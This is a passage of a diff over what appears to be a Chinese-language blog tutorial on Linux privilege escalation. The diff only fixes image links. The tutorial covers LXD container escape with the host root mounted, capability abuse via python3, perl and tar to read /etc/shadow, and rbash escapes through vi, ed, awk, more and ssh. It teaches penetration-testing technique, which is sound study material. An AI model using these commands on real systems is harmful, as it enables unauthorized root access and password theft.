 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># lxc init来初始化myimage，也就是alpine系统，并创建aaa账户，这里指的就是自己，通过c参数来配置安全提升策略为true，代表aaa可申请高级权限，命令如下：</span><br><span class="line">lxc init myimage aaa -c security.privileged=true</span><br><span class="line"># lxc config device命令用来配置设备，add把mydevice设备添加到了aaa账户中，disk是磁盘挂载，把本机/目录挂载到容器的/mnt下，recursive即是否递归，代表是否将所有子目录及所有文件进行挂载，命令如下：</span><br><span class="line">lxc config device add aaa mydevice disk source=/ path=/mnt/root recursive=true</span><br><span class="line"># 然后利用lxc start来启动刚刚添加的用户</span><br><span class="line">lxc start aaa</span><br><span class="line"># 最后利用lxc exec来执行程序，以aaa执行sh</span><br><span class="line">lxc exec aaa /bin/sh</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021714486.png" alt="image-20231002171403438"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021714486.png" alt="image-20231002171403438"></p>
 <p><strong>总结</strong></p>
 <p>1，目标机安装了lxd容器，且需要利用的普通用户在lxd组。</p>
 <p>2，下载alpine（轻量级的linux系统，大小在5m左右），传到目标机。</p>
@@ -641,44 +641,44 @@
 <p><strong>capability测试</strong></p>
 <p>setcap设置能力，getcat读取能力。</p>
 <p>getcap通过r参数来读取指定目录下有能力的程序</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021714104.png" alt="image-20231002171450060"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021714104.png" alt="image-20231002171450060"></p>
 <p><strong>能力滥用导致的提权</strong></p>
 <p>例如管理员要为python3程序设置超级权限给aaa用户，但没有用suid或sudo授权，而用的是capabilities，通过的是以下命令来设置的。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021715042.png" alt="image-20231002171531000"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021715042.png" alt="image-20231002171531000"></p>
 <p>因为root只想给aaa用户的python3能力，所以这里是将程序复制到了aaa用户下，如果直接设置bin下的python3程序，那么意味着任何用户都具有了相关能力。</p>
 <p>这时获取了aaa账户，然后通过getcap命令发现python3具有setuid能力，且属主和属于都是root。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021715175.png" alt="image-20231002171544130"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021715175.png" alt="image-20231002171544130"></p>
 <p>那么普通用户aaa就可执行python3程序来导入os包执行系统命令，从而进行提权。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021716322.png" alt="image-20231002171636279"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021716322.png" alt="image-20231002171636279"></p>
 <p>同理，下面是perl程序的测试：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021717923.png" alt="image-20231002171736861"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021717923.png" alt="image-20231002171736861"></p>
 <p>如果是一些无法调用命令的程序，例如tar，则可以想办法读取密码文件，然后进行破解的方式来提权。</p>
 <p>下面是tar的测试：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021717471.png" alt="image-20231002171756421"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021717471.png" alt="image-20231002171756421"></p>
 <p>这里赋予了cap_dac_read_search能力，即忽略文件读取和目录搜索的限制。</p>
 <p>利用思路：压缩etc&#x2F;shadow文件，然后解压查看密码，进行破解</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021718131.png" alt="image-20231002171820063"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021718131.png" alt="image-20231002171820063"></p>
 <p>之后破解密码即可</p>
 <p><strong>rbash绕过总结</strong></p>
 <p>rbash是Restricted bash缩写，即受限制的bash。管理员可通过指定普通用户的bash为rbash，以此来限制相关操作。在rbash中，很多行为和命令都会被受到限制。</p>
 <p>PS：这种确切说不属于提权，只是绕过rbash的限制，因为绕过后身份依旧是当前的普通账户。</p>
 <p>这里测试aaa账户，使用root将aaa账户的bash改为rbash。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021718547.png" alt="image-20231002171835503"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021718547.png" alt="image-20231002171835503"></p>
 <p>然后切换为aaa账号，发现环境为rbash，shell环境是rbash</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021718742.png" alt="image-20231002171846681"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021718742.png" alt="image-20231002171846681"></p>
 <p><strong>vi绕过</strong></p>
 <p>可以进入vi中执行set命令将shell改为&#x2F;bin&#x2F;sh，命令如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi</span><br><span class="line">:set shell=/bin/sh #回车</span><br><span class="line">:shell #回车</span><br><span class="line">cd /etc</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021719260.png" alt="image-20231002171912200"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021719260.png" alt="image-20231002171912200"></p>
 <p><strong>ed绕过</strong></p>
 <p>ed也是一个文件编辑的命令，和vi类似，也是内联编辑模式，可输入命令，相关命令如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ed</span><br><span class="line">!&#x27;/bin/sh&#x27;</span><br><span class="line">cd /etc</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021719510.png" alt="image-20231002171926461"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021719510.png" alt="image-20231002171926461"></p>
 <p><strong>sh、bash、dash绕过</strong></p>
 <p>默认情况下，可以在rbash中执行sh、bash、dash等命令，以此来绕过rbash。</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021719991.png" alt="image-20231002171949941"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021719991.png" alt="image-20231002171949941"></p>
 <p>同理，如果这些命令不被运行，而cp允许，则可以把这些文件复制到当前目录运行，但是当&#x2F;符号不被允许的话，则复制到当前目录的文件是无法执行的。</p>
 <p><strong>python、perl绕过</strong></p>
 <p>可以尝试运行python和perl命令，如果允许执行，则可以用程序来调用bin&#x2F;bash绕过rbash，相关命令如下：</p>
@@ -689,20 +689,20 @@
 <p>awk命令通过BEGIN参数来指定执行前的语句，命令如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk &#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021720343.png" alt="image-20231002172014298"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021720343.png" alt="image-20231002172014298"></p>
 <p><strong>more绕过</strong></p>
 <p>more命令读取文件内容时，可输入!’sh’进入sh来绕过rbash，这个需要当前目录下有文件可读，例如这里是在当前用户的家目录，则都会有.bashrc等文件，命令如下：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">more .bashrc</span><br><span class="line">!&#x27;sh&#x27;</span><br><span class="line">cd /</span><br><span class="line">pwd</span><br></pre></td></tr></table></figure>
 
 <p>（特别的，需要读取的文件内容较长，否则直接会输出，不进入命令行）</p>
 <p>这里以桌面的1.txt文件为例：</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021720560.png" alt="image-20231002172035522"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021720560.png" alt="image-20231002172035522"></p>
 <p>类似于more的可利用命令，还有less、man等，用法类似。</p>
 <p><strong>ssh登录绕过</strong></p>
 <p>ssh进行远程登录时，可通过t参数来强制分配给自己伪终端，指定强制分配给自己bash，然后指定–noprofile参数。bash默认允许时会调用当前用户的bashrc等配置，该参数添加后，bash启动不会读取当前用户的默认配置。</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh aaa@192.168.159.167 -t &quot;bash --noprofile&quot;</span><br></pre></td></tr></table></figure>
 
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021721244.png" alt="image-20231002172118186"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021721244.png" alt="image-20231002172118186"></p>
 <p><strong>漏洞提权</strong></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum">https://github.com/rebootuser/LinEnum</a></p>
 <p><a target="_blank" rel="noopener" href="https://github.com/redcode-labs/Bashark">https://github.com/redcode-labs/Bashark</a></p>
@@ -711,7 +711,7 @@
 <p><a target="_blank" rel="noopener" href="https://github.com/diego-treitos/linux-smart-enumeration">https://github.com/diego-treitos/linux-smart-enumeration</a></p>
 <p><strong>总结</strong></p>
 <p>一般情况下建议的是先查找非漏洞的提权方法，如果没有，则再根据内核版本来查找相关的提权漏洞</p>
-<p><img src="/https://raw.githubusercontent.com/cjb12/Pics/master/202310021721564.png" alt="image-20231002172139507"></p>
+<p><img src="https://raw.githubusercontent.com/cjb12/Pics/master/202310021721564.png" alt="image-20231002172139507"></p>
 <p><a target="_blank" rel="noopener" href="https://cxsecurity.com/">https://cxsecurity.com/</a></p>
 
       
